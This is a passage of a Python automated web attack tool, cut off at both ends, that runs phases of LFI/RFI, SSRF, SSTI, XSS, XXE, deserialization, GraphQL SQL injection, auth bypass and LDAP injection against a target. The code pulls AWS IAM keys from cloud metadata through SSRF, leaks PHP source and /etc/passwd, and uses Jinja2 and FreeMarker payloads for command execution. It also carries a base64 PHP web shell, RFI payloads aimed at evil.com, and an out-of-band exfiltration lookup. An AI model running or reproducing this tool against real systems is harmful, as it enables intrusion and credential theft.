                    vuln(f"CMDi (Blind) in '{param_name}'", "Critical", full_test)
                    add_vuln("Command Injection (Blind)", "Critical", full_test, f"param={param_name}")
                    
                    # OOB exfil
                    rand = ''.join(random.choices(string.ascii_lowercase, k=8))
                    oob_payload = f"{payload}| nslookup {rand}.burpcollaborator.net"
                    oob_params = params.copy()
                    oob_params[param_name] = [oob_payload]
                    qso = '&'.join([f"{k}={quote(v[0])}" for k,v in oob_params.items()])
                    try:
                        stealth.get(f"{base_url}?{qso}")
                        exploit(f"CMDi OOB exfil sent: {rand}.burpcollaborator.net", full_test)
                        add_exploit("Command Injection OOB", full_test, f"OOB: {rand}.burpcollaborator.net")
                    except:
                        pass
                    
            except:
                continue

# ============= PHASE 7: LFI/RFI =============
print(f"\n{Y}[PHASE 7]{RS} {BD}File Inclusion (LFI/RFI)...{RS}")

lfi_payloads = [
    ("../../../etc/passwd", "Path Traversal"),
    ("../../../../etc/passwd", "Deep Traversal"),
    ("....//....//....//etc/passwd", "Obfuscated"),
    ("..\\\\..\\\\..\\\\windows\\win.ini", "Windows Traversal"),
    ("php://filter/convert.base64-encode/resource=index", "PHP Wrapper"),
    ("php://filter/read=convert.base64-encode/resource=../config", "PHP Config"),
    ("php://filter/convert.base64-encode/resource=../wp-config", "WP Config"),
    ("file:///etc/passwd", "File Protocol"),
    ("/etc/passwd", "Absolute Path"),
    ("/proc/self/environ", "Environ"),
    ("/proc/self/fd/0", "FD 0"),
    ("/proc/self/fd/1", "FD 1"),
    ("/proc/self/fd/2", "FD 2"),
    ("php://input", "PHP Input"),
    ("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+", "Data Wrapper"),
    ("expect://id", "Expect Wrapper"),
    ("phar://test.phar", "PHAR Deserialization"),
]

rfi_payloads = [
    ("http://evil.com/shell.txt?", "RFI Basic"),
    ("https://evil.com/shell.txt?", "RFI HTTPS"),
    ("ftp://evil.com/shell.txt?", "RFI FTP"),
]

for test_url in test_urls[:20]:
    parsed = urlparse(test_url)
    params = parse_qs(parsed.query)
    base_url = test_url.split('?')[0]
    if not params:
        continue
    
    for param_name in params:
        if any(k in param_name.lower() for k in ['page', 'file', 'include', 'path', 'template', 'view', 'load']):
            # LFI
            for payload, ptype in lfi_payloads:
                test_params = params.copy()
                test_params[param_name] = [payload]
                try:
                    qs = '&'.join([f"{k}={quote(v[0])}" for k,v in test_params.items()])
                    full_test = f"{base_url}?{qs}"
                    r = stealth.get(full_test)
                    if not r:
                        continue
                    
                    # Check for file contents
                    if 'root:' in r.text and 'bin/' in r.text:
                        vuln(f"LFI ({ptype}) in '{param_name}'", "Critical", full_test)
                        add_vuln(f"LFI ({ptype})", "Critical", full_test, f"param={param_name}")
                        exploit(f"LFI - Read /etc/passwd", full_test)
                        add_exploit("LFI File Read", full_test)
                        add_exfil("LFI", "/etc/passwd", r.text[:500])
                        print(f"  {Y}[DATA]{RS} /etc/passwd via {ptype}")
                    
                    if '[fonts]' in r.text or '[extensions]' in r.text:
                        vuln(f"LFI - Windows file ({ptype}) in '{param_name}'", "Critical", full_test)
                        add_vuln("LFI Windows", "Critical", full_test)
                    
                    # PHP wrapper detection
                    if 'PD9waHA' in r.text or 'base64_decode' in r.text.lower():
                        b64_match = re.search(r'[A-Za-z0-9+/]{50,}={0,2}', r.text)
                        if b64_match:
                            try:
                                decoded = base64.b64decode(b64_match.group()).decode('utf-8', errors='replace')
                                if '<?php' in decoded or 'DB_HOST' in decoded or 'password' in decoded.lower() or 'api_key' in decoded.lower():
                                    vuln(f"LFI PHP Wrapper - source code leaked in '{param_name}'", "Critical", full_test)
                                    add_vuln("LFI PHP Wrapper Source Code", "Critical", full_test)
                                    exploit(f"LFI - Decoded PHP source", full_test)
                                    add_exploit("LFI PHP Source Code", full_test)
                                    add_exfil("LFI-PHP", "PHP Source", decoded[:1000])
                                    print(f"  {Y}[DATA]{RS} PHP source decoded: {decoded[:200]}...")
                            except:
                                pass
                except:
                    continue
            
            # RFI
            for payload, ptype in rfi_payloads:
                test_params = params.copy()
                test_params[param_name] = [payload]
                try:
                    qs = '&'.join([f"{k}={quote(v[0])}" for k,v in test_params.items()])
                    full_test = f"{base_url}?{qs}"
                    r = stealth.get(full_test, timeout=8)
                    # RFI is hard to detect without a listener
                    # Check if page behavior changed (no error when including remote URL)
                    if r and r.status_code == 200 and len(r.text) > 100:
                        info(f"Possible RFI in {param_name} - test with listener")
                        add_vuln("Possible RFI", "High", full_test)
                except:
                    continue

# ============= PHASE 8: SSRF =============
print(f"\n{Y}[PHASE 8]{RS} {BD}SSRF (Server-Side Request Forgery)...{RS}")

ssrf_targets = {
    'AWS IMDSv1': 'http://169.254.169.254/latest/meta-data/',
    'AWS IMDSv2': 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    'AWS IMDSv1 SSRF': 'http://169.254.169.254/latest/meta-data/',
    'GCP Metadata': 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
    'Azure Metadata': 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
    'Azure IMDS': 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/',
    'Localhost': 'http://127.0.0.1/',  
    'Localhost 8080': 'http://127.0.0.1:8080/',
    'Localhost 80': 'http://localhost/',
    'Localhost 443': 'https://127.0.0.1/',
    'Docker Socket': 'http://localhost:2375/containers/json',
    'Kubernetes API': 'https://kubernetes.default.svc/api/v1/namespaces/default/pods',
    'Internal DNS': 'http://internal.service.consul/',
    'Redis': 'http://127.0.0.1:6379/',
    'MongoDB': 'http://127.0.0.1:27017/',
    'Elasticsearch': 'http://127.0.0.1:9200/',
    'Memcached': 'http://127.0.0.1:11211/',
    'MySQL': 'http://127.0.0.1:3306/',
    'PostgreSQL': 'http://127.0.0.1:5432/',
    'RabbitMQ': 'http://127.0.0.1:15672/',
    'Prometheus': 'http://127.0.0.1:9090/',
    'Grafana': 'http://127.0.0.1:3000/',
    'Jenkins': 'http://127.0.0.1:8080/jenkins/',
}

for test_url in test_urls[:15]:
    parsed = urlparse(test_url)
    params = parse_qs(parsed.query)
    base_url = test_url.split('?')[0]
    if not params:
        continue
    
    for param_name in params:
        if any(k in param_name.lower() for k in ['url', 'src', 'source', 'link', 'load', 'fetch', 'file', 'image', 'img']):
            for ssrf_name, ssrf_url in list(ssrf_targets.items())[:8]:
                test_params = params.copy()
                test_params[param_name] = [ssrf_url]
                try:
                    qs = '&'.join([f"{k}={quote(v[0])}" for k,v in test_params.items()])
                    full_test = f"{base_url}?{qs}"
                    r = stealth.get(full_test, timeout=15)
                    if not r:
                        continue
                    
                    # Cloud metadata detection
                    cloud_indicators = {
                        'ami-id': 'AWS',
                        'instance-id': 'AWS',
                        'security-credentials': 'AWS IAM',
                        'AKIA': 'AWS Key',
                        'SecretAccessKey': 'AWS',
                        'account/': 'GCP/Azure',
                        'access_token': 'OAuth',
                        'refresh_token': 'OAuth',
                        'containers': 'Docker',
                        'kind': 'Pod',  # K8s
                        'cluster-info': 'K8s',
                    }
                    
                    for indicator, cloud in cloud_indicators.items():
                        if indicator in r.text:
                            vuln(f"SSRF - {cloud} metadata accessible via '{param_name}'", "Critical", full_test)
                            add_vuln("SSRF - Cloud Metadata", "Critical", full_test, f"target={ssrf_name}")
                            exploit(f"SSRF - {cloud} credentials exposed!", full_test)
                            add_exploit(f"SSRF {cloud}", full_test)
                            add_exfil("SSRF", f"{cloud} Metadata", r.text[:500])
                            
                            # Extract AWS creds if found
                            if 'AccessKeyId' in r.text and 'SecretAccessKey' in r.text:
                                try:
                                    cred_data = json.loads(r.text)
                                    if isinstance(cred_data, dict):
                                        for role_name, role_data in cred_data.items() if isinstance(cred_data, dict) else [('', cred_data)]:
                                            if isinstance(role_data, dict):
                                                cred(f"AWS AccessKey: {role_data.get('AccessKeyId', 'N/A')}")
                                                cred(f"AWS SecretKey: {role_data.get('SecretAccessKey', 'N/A')[:30]}...")
                                                cred(f"AWS Token: {role_data.get('Token', 'N/A')[:40]}...")
                                                add_cred("AWS IAM", role_data.get('AccessKeyId', 'N/A'), role_data.get('SecretAccessKey', 'N/A'))
                                except:
                                    # Maybe it's a list of roles
                                    roles = r.text.strip().split('\n')
                                    for role in roles[:5]:
                                        if role.strip():
                                            info(f"AWS Role found: {role.strip()}")
                            break
                    
                    # Try to get IAM role + creds specifically
                    if 'IAM' in ssrf_name:
                        role_params = params.copy()
                        role_params[param_name] = [f"http://169.254.169.254/latest/meta-data/iam/security-credentials/"]
                        qsr = '&'.join([f"{k}={quote(v[0])}" for k,v in role_params.items()])
                        try:
                            rr = stealth.get(f"{base_url}?{qsr}")
                            if rr:
                                roles = rr.text.strip().split('\n')
                                for role in roles[:3]:
                                    if role.strip():
                                        cred_url = f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role.strip()}"
                                        cred_params = params.copy()
                                        cred_params[param_name] = [cred_url]
                                        qsc = '&'.join([f"{k}={quote(v[0])}" for k,v in cred_params.items()])
                                        try:
                                            rc = stealth.get(f"{base_url}?{qsc}")
                                            if rc and 'AccessKeyId' in rc.text:
                                                exploit(f"AWS IAM Credentials for role: {role.strip()}", full_test)
                                                add_exploit("AWS IAM Role Extraction", full_test)
                                                add_exfil("SSRF-AWS", f"IAM Role {role.strip()}", rc.text[:500])
                                                try:
                                                    cred_data = json.loads(rc.text)
                                                    cred(f"AWS Key: {cred_data.get('AccessKeyId', 'N/A')}")
                                                    cred(f"AWS Secret: {cred_data.get('SecretAccessKey', 'N/A')[:20]}...")
                                                    add_cred("AWS IAM", cred_data.get('AccessKeyId', ''), cred_data.get('SecretAccessKey', ''))
                                                except:
                                                    pass
                                        except:
                                            pass
                        except:
                            pass
                    
                except:
                    continue

# ============= PHASE 9: SSTI =============
print(f"\n{Y}[PHASE 9]{RS} {BD}SSTI (Server-Side Template Injection)...{RS}")

ssti_payloads = [
    ("{{7*7}}", "Jinja2/Twig", "49"),
    ("${{7*7}}", "Freemarker", "49"),
    ("{{7*'7'}}", "Jinja2", "7777777"),
    ("#{7*7}", "Ruby/SLIM", "49"),
    ("*{7*7}", "Velocity", "49"),
    ("${7*7}", "JSP/EL", "49"),
    ("{{7*7}}", "Handlebars", "49"),
    ("<%= 7*7 %>", "ERB", "49"),
    ("${7*7}", "Freemarker (alt)", "49"),
    ("{{7|attr('__class__')}}", "Jinja2 Module"),
]

ssti_marker = random.randint(10000, 99999)

for test_url in test_urls[:15]:
    parsed = urlparse(test_url)
    params = parse_qs(parsed.query)
    base_url = test_url.split('?')[0]
    if not params:
        continue
    
    for param_name in params:
        for payload, engine, expected in ssti_payloads:
            test_payload = payload.replace('7*7', str(ssti_marker // 10))
            test_params = params.copy()
            test_params[param_name] = [test_payload]
            try:
                qs = '&'.join([f"{k}={quote(v[0])}" for k,v in test_params.items()])
                full_test = f"{base_url}?{qs}"
                r = stealth.get(full_test)
                if not r:
                    continue
                
                expected_str = str(ssti_marker // 10)
                expected_result = str(ssti_marker // 10 * ssti_marker // 10)
                expected_concat = str(ssti_marker // 10) * 7
                
                if expected_str in r.text and expected_result not in r.text and expected_concat not in r.text:
                    vuln(f"SSTI ({engine}) in '{param_name}'", "Critical", full_test)
                    add_vuln(f"SSTI ({engine})", "Critical", full_test, f"param={param_name}")
                    
                    # Try RCE for Jinja2
                    if 'Jinja2' in engine or 'Jinja2/Twig' in engine:
                        rce_cmds = [
                            ("{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "id"),
                            ("{{''.__class__.__mro__[1].__subclasses__()}}", "classes"),
                            ("{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}", "id2"),
                            ("{{lipsum.__globals__['os'].popen('id').read()}}", "lipsum"),
                            ("{{cycler.__init__.__globals__.os.popen('id').read()}}", "cycler"),
                            ("{{joiner.__init__.__globals__.os.popen('id').read()}}", "joiner"),
                            ("{{namespace.__init__.__globals__.os.popen('id').read()}}", "namespace"),
                        ]
                        for rce_payload, rce_name in rce_cmds:
                            rce_params = params.copy()
                            rce_params[param_name] = [rce_payload]
                            qsr = '&'.join([f"{k}={quote(v[0])}" for k,v in rce_params.items()])
                            try:
                                rr = stealth.get(f"{base_url}?{qsr}")
                                if rr and 'uid=' in rr.text:
                                    exploit(f"SSTI RCE via {engine} in '{param_name}'", full_test)
                                    add_exploit("SSTI RCE", full_test, f"engine={engine}")
                                    add_exfil("SSTI-RCE", "Command Output", rr.text[:500])
                                    print(f"  {Y}[RCE]{RS} SSTI RCE via {engine}!")
                                    break
                            except:
                                continue
                    
                    # Try RCE for FreeMarker
                    if 'Freemarker' in engine:
                        fm_cmds = [
                            ("${'freemarker.template.utility.Execute'?new()('id')}", "FM Execute"),
                            ("${product.getClass().forName('java.lang.Runtime').getMethod('exec', product.getClass().forName('java.lang.String')).invoke(product.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}", "FM Runtime"),
                        ]
                        for fm_payload, fm_name in fm_cmds:
                            fm_params = params.copy()
                            fm_params[param_name] = [fm_payload]
                            qsf = '&'.join([f"{k}={quote(v[0])}" for k,v in fm_params.items()])
                            try:
                                rf = stealth.get(f"{base_url}?{qsf}")
                                if rf and ('uid=' in rf.text or rf.status_code == 500):
                                    vuln(f"SSTI RCE (FreeMarker) - check response", "Critical", full_test)
                                    add_exploit("SSTI FreeMarker RCE", full_test)
                            except:
                                continue
                    break
            except:
                continue

# ============= PHASE 10: XSS (all types) =============
print(f"\n{Y}[PHASE 10]{RS} {BD}XSS (Cross-Site Scripting)...{RS}")

xss_payloads = [
    # Reflected
    ("<script>alert(1)</script>", "Reflected"),
    ("<img src=x onerror=alert(1)>", "Img onerror"),
    ("<svg/onload=alert(1)>", "SVG onload"),
    ("<body onload=alert(1)>", "Body onload"),
    ("<input autofocus onfocus=alert(1)>", "Autofocus"),
    ("<details open ontoggle=alert(1)>", "Details ontoggle"),
    ("<select autofocus onfocus=alert(1)>", "Select autofocus"),
    ("<textarea autofocus onfocus=alert(1)>", "Textarea autofocus"),
    ("<keygen autofocus onfocus=alert(1)>", "Keygen autofocus"),
    ("<video><source onerror=alert(1)>", "Video onerror"),
    ("<audio><source onerror=alert(1)>", "Audio onerror"),
    ("<marquee onstart=alert(1)>", "Marquee onstart"),
    # Tag break variants
    ("\"><script>alert(1)</script>", "Tag break angle"),
    ("'><script>alert(1)</script>", "Tag break single"),
    ("\"><img src=x onerror=alert(1)>", "Tag break img"),
    ("\"><svg/onload=alert(1)>", "Tag break svg"),
    ("</script><script>alert(1)</script>", "Close tag"),
    # Polyglot
    ("\"'><img src=x onerror=alert(1)>", "Polyglot"),
    # DOM-based
    ("javascript:alert(1)", "Protocol handler"),
    ("\";alert(1);//", "JS injection"),
    ("'-alert(1)-'", "JS template"),
    ("${alert(1)}", "JS template literal"),
    # UTF-7 (old IE)
    ('+ADw-script+AD4-alert(1)+ADw-/script+AD4-', 'UTF-7'),
    # Unicode variants
    ('<script\\x20>alert(1)</script>', 'Unicode space'),
    ("<SCRIPT>alert(1)</SCRIPT>", "Case bypass"),
    ("<ScRiPt>alert(1)</ScRiPt>", "Mixed case"),
    # Event handler variants
    ("<img src=x onerror=&#97;lert(1)>", "HTML entity"),
    ("<img src=x οnerrοr=alert(1)>", "Greek letters"),
]

for test_url in test_urls[:15]:
    parsed = urlparse(test_url)
    params = parse_qs(parsed.query)
    base_url = test_url.split('?')[0]
    if not params:
        continue
    
    for param_name in params:
        # Stored XSS check on forms
        for form in all_forms:
            if form['action'] == base_url or form['url'] == base_url:
                for payload, ptype in xss_payloads[:8]:
                    data = {}
                    for inp in form['inputs']:
                        if inp['name'] == param_name:
                            data[inp['name']] = payload
                        elif inp['type'] == 'hidden':
                            continue
                        else:
                            data[inp['name']] = 'test'
                    
                    try:
                        r = stealth.post(form['action'], data=data)
                        if r and payload[:20].lower() in r.text.lower():
                            vuln(f"Stored XSS ({ptype}) via '{param_name}'", "Critical", form['action'])
                            add_vuln("Stored XSS", "Critical", form['action'], f"param={param_name}")
                            exploit(f"Stored XSS - payload reflected in response", form['action'])
                            add_exploit("Stored XSS", form['action'])
                            break
                    except:
                        continue
        
        # Reflected XSS
        for payload, ptype in xss_payloads[:10]:
            test_params = params.copy()
            test_params[param_name] = [payload]
            try:
                qs = '&'.join([f"{k}={quote(v[0])}" for k,v in test_params.items()])
                full_test = f"{base_url}?{qs}"
                r = stealth.get(full_test)
                if r:
                    # Check if payload appears unencoded in response
                    check_payload = payload[:30]
                    if check_payload in r.text:
                        vuln(f"Reflected XSS ({ptype}) in '{param_name}'", "Critical", full_test)
                        add_vuln("Reflected XSS", "Critical", full_test, f"param={param_name}")
                        break
            except:
                continue

# ============= PHASE 11: OPEN REDIRECT =============
print(f"\n{Y}[PHASE 11]{RS} {BD}Open Redirect...{RS}")

redirect_payloads = [
    ("//evil.com", "Protocol-relative"),
    ("https://evil.com/test", "Full URL"),
    ("//evil.com%2f..", "Double slash bypass"),
    ("https://evil.com%2f%2f..", "URL encode bypass"),
    ("/\\evil.com", "Backslash bypass"),
    ("@evil.com", "At sign"),
    ("https://evil.com:443@real.com", "Credentials"),
    ("https://evil.com.evil.com", "Subdomain"),
    ("//evil.com\\@real.com", "Mixed"),
    ("https://evil.com%00real.com", "Null byte"),
]

for test_url in test_urls[:10]:
    parsed = urlparse(test_url)
    params = parse_qs(parsed.query)
    base_url = test_url.split('?')[0]
    if not params:
        continue
    
    for param_name in params:
        if any(k in param_name.lower() for k in ['url', 'link', 'redirect', 'return', 'next', 'goto', 'target', 'to', 'dest', 'destination', 'out', 'view', 'dir']):
            for payload, ptype in redirect_payloads:
                test_params = params.copy()
                test_params[param_name] = [payload]
                try:
                    qs = '&'.join([f"{k}={quote(v[0])}" for k,v in test_params.items()])
                    full_test = f"{base_url}?{qs}"
                    r = stealth.get(full_test, allow_redirects=False)
                    if r:
                        loc = r.headers.get('Location', r.headers.get('location', ''))
                        if 'evil.com' in loc:
                            vuln(f"Open Redirect ({ptype}) in '{param_name}' -> {loc[:60]}", "Medium", full_test)
                            add_vuln("Open Redirect", "Medium", full_test)
                            exploit(f"Open Redirect - redirects to: {loc[:80]}", full_test)
                            add_exploit("Open Redirect", full_test)
                            break
                except:
                    continue

# ============= PHASE 12: XXE (XML External Entity) =============
print(f"\n{Y}[PHASE 12]{RS} {BD}XXE (XML External Entity)...{RS}")

xxe_payloads = [
    """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>""",
    """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>""",
    """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
]>
<root>&xxe;</root>""",
    """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>""",
    # Blind XXE
    """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://oob.test/xxe.dtd">
  %xxe;
]>
<root>test</root>""",
]

# Test API endpoints with XML
for api in all_api_endpoints[:10] + test_urls[:5]:
    try:
        for xxe_payload in xxe_payloads:
            r = stealth.post(api, data=xxe_payload, headers={'Content-Type': 'application/xml'})
            if not r:
                r = stealth.post(api, data=xxe_payload, headers={'Content-Type': 'text/xml'})
            if r:
                if 'root:' in r.text and 'bin/' in r.text:
                    vuln(f"XXE - File read via {api}", "Critical", api)
                    add_vuln("XXE File Read", "Critical", api)
                    exploit(f"XXE - Read /etc/passwd", api)
                    add_exploit("XXE File Read", api)
                    add_exfil("XXE", "/etc/passwd", r.text[:500])
                    print(f"  {Y}[DATA]{RS} /etc/passwd via XXE: {r.text[:150]}...")
                
                if 'ami-id' in r.text or 'instance-id' in r.text:
                    vuln(f"XXE - Cloud metadata via {api}", "Critical", api)
                    add_vuln("XXE Cloud Metadata", "Critical", api)
                
                if 'PD9waHA' in r.text:
                    b64_match = re.search(r'[A-Za-z0-9+/]{50,}={0,2}', r.text)
                    if b64_match:
                        try:
                            decoded = base64.b64decode(b64_match.group()).decode('utf-8', errors='replace')
                            add_exfil("XXE-PHP", "PHP Source", decoded[:500])
                        except:
                            pass
    except:
        continue

# ============= PHASE 13: DESERIALIZATION =============
print(f"\n{Y}[PHASE 13]{RS} {BD}Insecure Deserialization...{RS}")

# PHP deserialization
php_deser_payloads = [
    'O:1:"a":0:{}',
    'O:4:"User":1:{s:4:"role";s:5:"admin";}',
    'O:7:"SqlUtil":0:{}',
    'a:1:{i:0;O:7:"SqlUtil":0:{}}',
]

# Java deserialization headers
java_headers = [
    'rO0ABXNyABRqYXZhLnV0aWwuUmFuZG9tAAAAAAAAAAAAAAAAeHIAE2phdmEubGFuZy5OdW1iZXKHYkR4m+0DAAAeQAAAAHg=',
]

for form in all_forms:
    try:
        # Check for PHP serialized objects in requests
        for inp in form['inputs']:
            if inp['name'].startswith('serialize') or inp['name'] in ['data', 'state', 'session']:
                for php_payload in php_deser_payloads:
                    data = {inp['name']: php_payload}
                    r = stealth.post(form['action'], data=data)
                    if r and r.status_code == 500:
                        info(f"Possible PHP deserialization in {inp['name']}")
                        vuln(f"PHP Deserialization trigger in '{inp['name']}'", "High", form['action'])
                        add_vuln("PHP Deserialization", "High", form['action'])
    except:
        continue

# Check for Java deserialization via cookies
for cookie_name in ['JSESSIONID', 'SESSION', 'remember-me', 'auth']:
    try:
        for java_payload in java_headers:
            r = stealth.get(target, cookies={cookie_name: java_payload})
            if r and r.status_code == 500:
                vuln(f"Java Deserialization via cookie '{cookie_name}'", "Critical", target)
                add_vuln("Java Deserialization", "Critical", target)
                exploit(f"Java Deserialization - Cookie manipulation", target)
                add_exploit("Java Deserialization", target)
    except:
        continue

# ============= PHASE 14: GRAPHQL =============
print(f"\n{Y}[PHASE 14]{RS} {BD}GraphQL Introspection...{RS}")

graphql_endpoints = ['/graphql', '/graphiql', '/v1/graphql', '/api/graphql', '/gql']

for endpoint in graphql_endpoints:
    full_url = urljoin(target, endpoint)
    # Test introspection
    introspection_query = {
        'query': '''
        query {
            __schema {
                types {
                    name
                    fields {
                        name
                        type {
                            name
                        }
                    }
                }
            }
        }
        '''
    }
    try:
        r = stealth.post(full_url, json=introspection_query, timeout=10)
        if r and r.status_code == 200 and '__schema' in r.text:
            vuln(f"GraphQL Introspection enabled at {endpoint}", "Medium", full_url)
            add_vuln("GraphQL Introspection", "Medium", full_url)
            exploit(f"GraphQL schema leak via introspection", full_url)
            add_exploit("GraphQL Introspection", full_url)
            
            # Try to extract sensitive fields
            try:
                schema_data = r.json()
                types = schema_data.get('data', {}).get('__schema', {}).get('types', [])
                sensitive_fields = ['password', 'token', 'secret', 'credit', 'ssn', 'email', 'phone']
                found_fields = []
                for t in types[:30]:
                    fields = t.get('fields', [])
                    for f in fields:
                        if any(s in f.get('name', '').lower() for s in sensitive_fields):
                            found_fields.append(f"{t.get('name')}.{f.get('name')}")
                if found_fields:
                    vuln(f"GraphQL - Sensitive fields exposed: {', '.join(found_fields[:10])}", "High", full_url)
                    add_vuln("GraphQL Sensitive Fields", "High", full_url)
                    add_exfil("GraphQL", "Sensitive Fields", str(found_fields[:20]))
            except:
                pass
        
        # Try mutation injection
        mutation_test = {
            'query': '''
            mutation {
                login(input: {username: "admin", password: "test"}) {
                    token
                }
            }
            '''
        }
        r2 = stealth.post(full_url, json=mutation_test, timeout=10)
        if r2 and r2.status_code == 200 and ('token' in r2.text or 'errors' not in r2.text):
            info(f"GraphQL mutation endpoint accessible")
            
            # Try SQLi in GraphQL
            gql_sqli = {
                'query': '''
                query {
                    user(id: "1' OR '1'='1") {
                        id
                        email
                        password
                    }
                }
                '''
            }
            r3 = stealth.post(full_url, json=gql_sqli, timeout=10)
            if r3 and 'email' in r3.text and 'password' in r3.text and len(r3.text) > 50:
                vuln(f"GraphQL SQL Injection via user query", "Critical", full_url)
                add_vuln("GraphQL SQLi", "Critical", full_url)
                exploit(f"GraphQL SQLi - user data extracted", full_url)
                add_exploit("GraphQL SQLi", full_url)
                add_exfil("GraphQL SQLi", "User Data", r3.text[:500])
    except:
        continue

# ============= PHASE 15: API SECURITY =============
print(f"\n{Y}[PHASE 15]{RS} {BD}API Security Testing...{RS}")

api_auth_tests = [
    # Missing auth
    ({}, "No Auth"),
    # Various token formats
    ({'Authorization': 'Bearer invalid'}, "Invalid Bearer"),
    ({'Authorization': 'Token invalid'}, "Invalid Token"),
    ({'Authorization': 'Basic ' + base64.b64encode(b'admin:admin').decode()}, "Basic Auth"),
    ({'X-API-Key': 'admin'}, "X-API-Key"),
    ({'X-Auth-Token': 'admin'}, "X-Auth-Token"),
    ({'api_key': 'test'}, "Query API Key"),
    ({'access_token': 'test'}, "Access Token"),
]

for api in all_api_endpoints[:15]:
    for auth_headers, auth_type in api_auth_tests:
        try:
            r = stealth.get(api, headers=auth_headers)
            if r and r.status_code == 200 and len(r.text) > 20:
                if 'error' not in r.text.lower() and 'unauthorized' not in r.text.lower() and 'invalid' not in r.text.lower():
                    vuln(f"API Auth Bypass ({auth_type}) - {api}", "Critical", api)
                    add_vuln("API Auth Bypass", "Critical", api, f"auth={auth_type}")
                    exploit(f"API accessible with {auth_type} headers", api)
                    add_exploit("API Auth Bypass", api)
                    break
        except:
            continue

# IDOR testing
if all_api_endpoints:
    print(f"\n  {C}[IDOR testing]{RS}")
    for api in all_api_endpoints[:10]:
        # Try common ID patterns
        id_patterns = ['1', '2', 'admin', 'test', '0', '-1', '99999']
        for id_val in id_patterns:
            # Replace numeric IDs in the URL
            for pattern in [r'/(\d+)', r'/id/(\d+)', r'?id=(\d+)', r'&id=(\d+)']:
                new_url = re.sub(pattern, lambda m: m.group(0).replace(m.group(1), id_val), api)
                if new_url != api:
                    try:
                        r = stealth.get(new_url)
                        if r and r.status_code == 200 and len(r.text) > 20 and 'error' not in r.text.lower():
                            vuln(f"Possible IDOR at {new_url}", "High", new_url)
                            add_vuln("IDOR", "High", new_url)
                            break
                    except:
                        continue

# ============= PHASE 16: WORDPRESS SPECIFIC =============
print(f"\n{Y}[PHASE 16]{RS} {BD}WordPress Security...{RS}")

# If WordPress detected
if 'WordPress' in str(results['info']) or 'wp-content' in str(results['info']):
    wp_checks = [
        '/wp-json/wp/v2/users', '/wp-json/', '/xmlrpc.php',
        '/wp-content/debug.log', '/wp-content/uploads/',
        '/wp-content/plugins/', '/wp-content/themes/',
        '/wp-admin/admin-ajax.php', '/wp-cron.php',
        '/wp-config.php.bak', '/.wp-config.php.swp',
    ]
    for wp_path in wp_checks:
        full_url = urljoin(target, wp_path)
        try:
            r = stealth.get(full_url)
            if r and r.status_code == 200:
                vuln(f"WordPress file accessible: {wp_path}", "Medium", full_url)
                add_vuln("WordPress Exposure", "Medium", full_url)
                if 'users' in wp_path:
                    try:
                        users = r.json()
                        for user in users[:5]:
                            user_name = user.get('name', user.get('slug', ''))
                            cred(f"WP User: {user_name}")
                            add_cred("WordPress", user_name, '', '')
                    except:
                        pass
        except:
            continue

# ============= PHASE 17: HEADER INJECTION =============
print(f"\n{Y}[PHASE 17]{RS} {BD}Header Injection / Host Header...{RS}")

# Host header injection
try:
    r = stealth.get(target, headers={'Host': 'evil.com'})
    if r:
        if 'evil.com' in r.text or 'evil.com' in str(r.headers):
            vuln("Host Header Injection - host reflected in response", "Medium", target)
            add_vuln("Host Header Injection", "Medium", target)
            exploit("Host Header Injection possible", target)
            add_exploit("Host Header Injection", target)
except:
    pass

# CRLF Injection
try:
    r = stealth.get(target, headers={'X-Forwarded-For': '127.0.0.1%0d%0aX-Custom:%20injected'})
    if r and 'Custom' in str(r.headers):
        vuln("CRLF Injection in headers", "Critical", target)
        add_vuln("CRLF Injection", "Critical", target)
except:
    pass

# ============= PHASE 18: RACE CONDITION =============
print(f"\n{Y}[PHASE 18]{RS} {BD}Race Condition Testing...{RS}")

# Test for race conditions on forms (if any)
race_target = None
for form in all_forms:
    if form['method'] == 'POST':
        race_target = form['action']
        break

if race_target:
    def race_request(url, data, results_list, idx):
        try:
            r = stealth.post(url, data=data)
            results_list[idx] = r
        except:
            results_list[idx] = None
    
    data = {}
    for inp in form['inputs']:
        if inp['name']:
            data[inp['name']] = 'test'
    
    # Send 10 concurrent requests
    threads = []
    race_results = [None] * 10
    for i in range(10):
        t = threading.Thread(target=race_request, args=(race_target, data, race_results, i))
        threads.append(t)
        t.start()
    
    for t in threads:
        t.join()
    
    # Check for different responses
    status_codes = set()
    for r in race_results:
        if r:
            status_codes.add(r.status_code)
    if len(status_codes) > 1:
        info(f"Possible race condition - different status codes: {status_codes}")
        vuln("Potential Race Condition", "Medium", race_target)
        add_vuln("Race Condition", "Medium", race_target)

# ============= PHASE 19: LDAP & PATH TRAVERSAL =============
print(f"\n{Y}[PHASE 19]{RS} {BD}LDAP / Advanced Traversal...{RS}")

ldap_payloads = [
    ('*', 'Wildcard'),
    ('*)(uid=*)', 'LDAP Injection'),
    ('*)(|(password=*))', 'LDAP Auth Bypass'),
    ('admin*', 'Admin Wildcard'),
]

for form in all_forms:
    for inp in form['inputs']:
        if inp['name'].lower() in ['user', 'username', 'uid', 'cn']:
            for payload, ptype in ldap_payloads:
                data = {inp['name']: payload}
                try:
                    r = stealth.post(form['action'], data=data)
                    if r and r.status_code == 302:
                        vuln(f"LDAP Injection ({ptype}) in '{inp['name']}'", "Critical", form['action'])
                        add_vuln("LDAP Injection", "Critical", form['action'])
                except:
                    continue

# ============= PHASE 20: DEFAULT CREDENTIALS =============
